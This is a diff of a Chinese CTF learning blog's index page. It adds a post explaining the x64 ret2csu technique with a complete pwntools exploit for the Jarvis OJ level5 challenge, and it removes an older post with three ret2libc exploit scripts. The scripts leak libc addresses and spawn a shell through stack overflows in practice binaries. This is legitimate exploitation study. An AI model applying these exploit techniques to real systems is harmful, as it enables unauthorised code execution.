@@ -252,6 +252,206 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/pwn学习（9）中级ROP（一）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/26/pwn学习（9）中级ROP（一）/" itemprop="url">pwn学习（9）中级ROP（一）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-26T21:16:45+08:00">
+                2018-11-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>周六周末简单复习了一下计算机网络的前三章，稍微撇了几眼数据结构，甚至还试着拿angr去做了做某个比赛的逆向题。。。想想自己还有四级需要准备就有点头疼，不过pwn还是得学啊，中级ROP大概会写两次博客吧</p>
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>不知道大家有没有和我一样的经历，拿到一个64程序，看上去漏洞很明显然后就开始想着拿payload覆盖数据，泄漏libc然后重复调用漏洞函数……怎么说呢，思路倒是没什么错，但是忽视了很重要的问题——64位程序传递参数的方式是优先使用寄存器的（准确的说是前6个参数），多出来的才用栈传递，这就限制了我们不能再简单的去用覆盖数据的方式实现函数的调用了。当然，我们还是可以使用gadgets来凑出来的，但是往往没有是那么合适的，这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<br>为什么呢？下面就来看一看</p>
+<blockquote>
+<p>一下内容来自某英文网站<a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxlugqem5tj313u0u0q82.jpg" alt=""><br>图片为32位，作为参考<br>从上图我们可以看到，当运行程序的时候，首先shell会使用 execve() 函数来出发系统调用。这时候系统会为我们的程序分配栈区并将argc、argv、envp压栈，按照shell设定fd，装载器还要进行重定位和调用预初始化器（preinitializers），然后就从_start来执行代码了。<br>利用ida（当然gdb、objdump上面的也一样）来看一下这段代码，重要的部分我都标记了注释<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxlvqgdsruj30ku09ewg8.jpg" alt=""><br>一点一点来看，首先xor了ebp也就是将ebp置为了0，然后紧接着就是pop，也就是将我们的栈顶的值拿了出来，根据之前的execve的压栈方式我们可以知道也就是argc，当我们pop后栈顶就成了argv，一个mov也就让我们成功拿到了，这么说大家也应该明白了，其实之后的几句都是在准备参数。<br>细致分析下来一共有7个参数，前六个按照x64的准则由rsi、rdi、rdx、rcx、r8、r9来传递，第七个则是利用栈来传递的，其中比较重要的参数应该是main的地址，argc、argv以及__libc_csu_init、__libc_csu_fini<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmp1fev7qj31eu0i8dpr.jpg" alt=""><br>如图所示即调用__libc_start_main时寄存器的情况<br>至于__libc_start_main函数做了什么呢？首先设置了uid和gid，然后启动线程，寄存fini和rtld_fini的参数，调用__libc_csu_init，调用main，调用exit。<br>这里就看到了我们调用程序几乎必然要用到这个函数，所以我们可以利用它来传递寄存器的值</p>
+</blockquote>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目是jarvis oj上的level5，首先还是file+checksec+ida<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxls5e0fvrj30iw064t9g.jpg" alt=""><br>漏洞很明显，但程序本身没有system和/bin/sh字符串，所以还是考虑用泄漏libc地址的方式来做。<br>因为程序用过了write函数我们就考虑泄漏它的地址，利用libc_csu_gadgets实现，并且再次跳转回主函数<br>计算出libc的地址，进而拿到execve的地址和/bin/sh字符串的地址<br>再次利用libc_csu_gadgets来将这两个地址写入到bss段，然后执行就好了<br>官方的exp如下<br>    from pwn import *</p>
+<pre><code>#context.log_level = &apos;debug&apos;
+
+level5 = ELF(&apos;./level5.dms&apos;)
+sh = process(&apos;./level5.dms&apos;)
+libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
+write_got = level5.got[&apos;write&apos;]
+read_got = level5.got[&apos;read&apos;]
+main_addr = level5.symbols[&apos;main&apos;]
+bss_base = level5.bss()
+csu_front_addr = 0x0000000000400600
+csu_end_addr = 0x000000000040061A
+fakeebp = &apos;b&apos; * 8
+
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = &apos;a&apos; * 0x80 + fakeebp
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += &apos;a&apos; * 0x38
+    payload += p64(last)
+    sh.send(payload)
+    sleep(1)
+
+
+sh.recvuntil(&apos;Hello, World\n&apos;)
+## RDI, RSI, RDX, RCX, R8, R9, more on the stack
+## write(1,write_got,8)
+csu(0, 1, write_got, 8, write_got, 1, main_addr)
+
+write_addr = u64(sh.recv(8))
+libc_base = write_addr - libc.symbols[&apos;write&apos;]
+execve_addr = libc_base + libc.symbols[&apos;execve&apos;]
+log.success(&apos;execve_addr &apos; + hex(execve_addr))
+##gdb.attach(sh)
+
+## read(0,bss_base,16)
+## read execve_addr and /bin/sh\x00
+sh.recvuntil(&apos;Hello, World\n&apos;)
+csu(0, 1, read_got, 16, bss_base, 0, main_addr)
+sh.send(p64(execve_addr) + &apos;/bin/sh\x00&apos;)
+
+sh.recvuntil(&apos;Hello, World\n&apos;)
+## execve(bss_base+8)
+gdb.attach(sh)
+csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
+sh.interactive()
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2012,217 +2212,6 @@ sh.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（二）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/pwn学习（二）/" itemprop="url">pwn学习（二）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T19:25:46+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干</p>
-<h2 id="Ret2ilbc"><a href="#Ret2ilbc" class="headerlink" title="Ret2ilbc"></a>Ret2ilbc</h2><p>首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。</p>
-<p>下面就来看ctf wiki给出的三个例题吧，首先是第一个</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg" alt="1.jpg"></p>
-<p>很显然gets处存在栈溢出漏洞，紧接着我们来看看程序给我们“提供”了什么可以利用的点</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d799d6b0.jpg" alt="2.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d79dd2f6.jpg" alt="3.jpg"></p>
-<p>可以看到程序非常大方的给了我们/bin/sh的字符串和system函数，那任务就结束了，我们只需要溢出s将函数的返回地址设置为system的地址，紧接着将system的参数设置为字符串的地址即可，直接上脚本了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p = process(<span class="string">'./ret2libc1.dms'</span>)
-system = <span class="number">0x8048460</span>
-bin = <span class="number">0x08048720</span>
-payload = flat([<span class="string">'a'</span>*<span class="number">112</span>,system,<span class="string">'b'</span>*<span class="number">4</span>],bin)
-p.sendline(payload)
-p.interactive()
-
-</code></pre>
-<p>注意，我们的system作为我们将要返回的函数，他自然也有要返回的函数，因为我们只需要拿到sh，所以他具体返回什么我们就不用操心了，所以直接拿4个b把他的返回地址给填充掉就好了。当然，这是我们手动找到了system函数的地址，是不是还有其他的办法呢？当然有了，脚本一改</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p = process(<span class="string">'./ret2libc1.dms'</span>)
-elf = ELF(<span class="string">'./ret2libc1.dms'</span>)
-system_addr = elf.plt[<span class="string">'system'</span>]
-bin_addr = <span class="number">0x8048720</span>
-payload = <span class="number">112</span>*<span class="string">'a'</span> + p32(system_addr) +<span class="string">'b'</span>*<span class="number">4</span> + p32(bin_addr)
-p.sendline(payload)
-p.interactive()
-</code></pre>
-<p>这里我们使用了ELF加载了我们的程序，而ELF的plt中就是保存着我们的地址与函数的一一映射，因此我们用plt[‘system’]就可以拿到system的地址了</p>
-<p>紧接着看第二个题目</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7a55c91.jpg" alt="4.jpg"></p>
-<p>溢出点还是gets函数，但这次就没有第一次那么简单了，虽然还有system函数，但是没有可以供我们使用的/bin/sh字符串了，这时候我们就要开动脑筋想一想了，毛爷爷说过，没有条件创造条件，他没给字符串，我们可不可以自己输入一个进去呢？我们抓紧来看一下</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7a315ee.jpg" alt="5.jpg"></p>
-<p>首先就是天时啊，程序有个gets的函数，那我们何不借东风？拿它来一招瞒天过海？</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7a36b5a.jpg" alt="6.jpg"></p>
-<p>其次地利也有啊，bss段又个0x64长度的buf2数组没被用过，刚好我们瞒天过海而来的字符串就由它再暗度陈仓了。天时地利，就差exp了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p = process(<span class="string">'./ret2libc2.dms'</span>)
-elf = ELF(<span class="string">'./ret2libc2.dms'</span>)
-gets_addr = elf.plt[<span class="string">'gets'</span>]
-system_addr = elf.plt[<span class="string">'system'</span>]
-pop_ebx = <span class="number">0x0804843d</span>
-buf2 = <span class="number">0x804A080</span>
-payload = <span class="number">112</span>*<span class="string">'a'</span> + p32(gets_addr) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + <span class="number">4</span>*<span class="string">'a'</span> + p32(buf2)
-p.sendline(payload)
-p.sendline(<span class="string">"/bin/sh"</span>)
-p.interactive()
-
-</code></pre>
-<p>这里简单提一句为什么会有个pop ebx，主要是gets函数其实是改变了堆栈状态的，我们这里使用了pop主要是为了平衡堆栈的，你pop谁都可以，add也行。</p>
-<p>趁热打铁把第三题也做了，这个题比起上面的两个题难度系数高了很多，这次是既没有了system函数也没有了/bin/sh，那就比较麻烦了，我们要找的东西可就多了。不过有个好消息就是我们的system函数是属于libc，而libc.so里函数的相对偏移是一定的，更让人高兴的是即使程序ASLR的保护，也只是针对地址的中间位进行随机，最低的12位并不会发生改变，而这些github上都有人把工作给我们做好了，我们只需要知道一个函数在libc的地址，就可以顺藤摸瓜搞到所有函数（甚至还有字符串/bin/sh）的地址，这样就人工创造了天时地利，只差我们的exp了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher
-p = process(<span class="string">'./ret2libc3.dms'</span>)
-e = ELF(<span class="string">'./ret2libc3.dms'</span>)
-puts_plt = e.plt[<span class="string">'puts'</span>]
-puts_got = e.got[<span class="string">'puts'</span>]
-main = e.symbols[<span class="string">'main'</span>]
-p.recv()
-p.sendline(flat([<span class="string">'A'</span> * <span class="number">0x70</span>, puts_plt, main, puts_got]))
-puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])
-libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)
-libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)
-system_addr = libcbase + libc.dump(<span class="string">'system'</span>)
-binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)
-p.sendline(flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="string">'b'</span>*<span class="number">4</span>, binsh_addr]))
-p.interactive()
-
-</code></pre>
-<p>这里用到了新的工具—LibcSearcher，这个工具主要是能够帮助我们轻松的利用已有的got表的泄漏快速找到我们想要的东西，用法也很简单LibcSeacher(‘函数名’,地址)得到了libc，之后libc.dump()就可以得到偏移了，之后按照之前的方法构造payload就好了。要注意这里我们的pad要-8，因为我们是在main函数里又调用了main函数。</p>
-<p>successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2273,7 +2262,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
